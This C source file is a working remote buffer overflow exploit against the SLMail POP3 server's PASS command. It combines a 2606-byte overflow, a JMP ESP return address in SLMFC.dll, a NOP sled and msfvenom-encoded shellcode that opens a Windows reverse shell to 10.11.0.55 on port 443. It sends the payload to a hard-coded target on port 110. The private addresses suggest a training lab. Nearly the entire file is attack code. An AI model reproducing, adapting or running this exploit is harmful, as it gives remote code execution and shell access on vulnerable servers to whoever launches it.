#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#define retadd "\x8f\x35\x4a\x5f" /*JMP ESP in SLMFC.dll 0x5f4a358f */

#define port 110

/* msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.55 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" */
char shellcode[] =
"\xbb\xbe\x49\x28\x27\xdd\xc0\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xc0\x04\x31\x58\x0e\x03\xe6\x47\xca\xd2\xea\xb0\x88"
"\x1d\x12\x41\xed\x94\xf7\x70\x2d\xc2\x7c\x22\x9d\x80\xd0\xcf"
"\x56\xc4\xc0\x44\x1a\xc1\xe7\xed\x91\x37\xc6\xee\x8a\x04\x49"
"\x6d\xd1\x58\xa9\x4c\x1a\xad\xa8\x89\x47\x5c\xf8\x42\x03\xf3"
"\xec\xe7\x59\xc8\x87\xb4\x4c\x48\x74\x0c\x6e\x79\x2b\x06\x29"
"\x59\xca\xcb\x41\xd0\xd4\x08\x6f\xaa\x6f\xfa\x1b\x2d\xb9\x32"
"\xe3\x82\x84\xfa\x16\xda\xc1\x3d\xc9\xa9\x3b\x3e\x74\xaa\xf8"
"\x3c\xa2\x3f\x1a\xe6\x21\xe7\xc6\x16\xe5\x7e\x8d\x15\x42\xf4"
"\xc9\x39\x55\xd9\x62\x45\xde\xdc\xa4\xcf\xa4\xfa\x60\x8b\x7f"
"\x62\x31\x71\xd1\x9b\x21\xda\x8e\x39\x2a\xf7\xdb\x33\x71\x90"
"\x28\x7e\x89\x60\x27\x09\xfa\x52\xe8\xa1\x94\xde\x61\x6c\x63"
"\x20\x58\xc8\xfb\xdf\x63\x29\xd2\x1b\x37\x79\x4c\x8d\x38\x12"
"\x8c\x32\xed\xb5\xdc\x9c\x5e\x76\x8c\x5c\x0f\x1e\xc6\x52\x70"
"\x3e\xe9\xb8\x19\xd5\x10\x2b\x2c\x21\x1a\x9c\x58\x37\x1a\xe3"
"\x23\xbe\xfc\x89\x43\x97\x57\x26\xfd\xb2\x23\xd7\x02\x69\x4e"
"\xd7\x89\x9e\xaf\x96\x79\xea\xa3\x4f\x8a\xa1\x99\xc6\x95\x1f"
"\xb5\x85\x04\xc4\x45\xc3\x34\x53\x12\x84\x8b\xaa\xf6\x38\xb5"
"\x04\xe4\xc0\x23\x6e\xac\x1e\x90\x71\x2d\xd2\xac\x55\x3d\x2a"
"\x2c\xd2\x69\xe2\x7b\x8c\xc7\x44\xd2\x7e\xb1\x1e\x89\x28\x55"
"\xe6\xe1\xea\x23\xe7\x2f\x9d\xcb\x56\x86\xd8\xf4\x57\x4e\xed"
"\x8d\x85\xee\x12\x44\x0e\x0e\xf1\x4c\x7b\xa7\xac\x05\xc6\xaa"
"\x4e\xf0\x05\xd3\xcc\xf0\xf5\x20\xcc\x71\xf3\x6d\x4a\x6a\x89"
"\xfe\x3f\x8c\x3e\xfe\x15"; 

struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2970);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2607);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 9);
    memset(nop, 0x90, 8);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.14.70");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
